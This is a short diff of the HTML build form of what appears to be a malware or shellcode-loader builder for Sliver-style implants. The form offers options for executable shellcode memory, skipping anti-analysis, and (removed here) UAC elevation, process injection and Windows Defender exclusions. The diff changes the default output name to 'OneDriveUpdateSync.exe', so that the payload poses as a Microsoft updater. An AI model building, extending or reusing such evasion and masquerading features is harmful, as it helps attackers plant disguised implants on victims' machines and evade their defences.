@@ -122,11 +122,8 @@
 
             <fieldset class="field">
               <legend>Compile-time flags</legend>
-              <label class="check"><input type="checkbox" name="uac" id="bld-uac">       <span>UAC — <code>/MANIFESTUAC</code> (EXE) or self-elevation (DLL)</span></label>
               <label class="check"><input type="checkbox" name="rwx" id="bld-rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
               <label class="check"><input type="checkbox" name="debug" id="bld-debug">   <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
-              <label class="check hidden" id="field-inject-opt"><input type="checkbox" name="inject" id="bld-inject"> <span>ENABLE_INJECT — migrate shellcode to idle process on reboot, terminate host</span></label>
-              <label class="check hidden" id="field-wdexcl-opt"><input type="checkbox" name="wd_excl" id="bld-wdexcl"> <span>ENABLE_WD_EXCL — add Windows Defender path/process exclusions (UAC builds only)</span></label>
             </fieldset>
 
             <!-- Payload.h source -->
@@ -145,9 +142,9 @@
             <!-- EXE output name (EXE mode only) -->
             <label class="field" id="field-exe-name">
               <span>Output filename <em>(optional)</em></span>
-              <input type="text" id="bld-exe-name" placeholder="msoia.exe"
+              <input type="text" id="bld-exe-name" placeholder="OneDriveUpdateSync.exe"
                      autocomplete="off" spellcheck="false">
-              <span style="font-size:11px;color:var(--text-mute)">Defaults to <code>msoia.exe</code>. Must end in <code>.exe</code>.</span>
+              <span style="font-size:11px;color:var(--text-mute)">Defaults to <code>OneDriveUpdateSync.exe</code>. Must end in <code>.exe</code>.</span>
             </label>
 
             <!-- sideload config — shown only in sideload mode -->
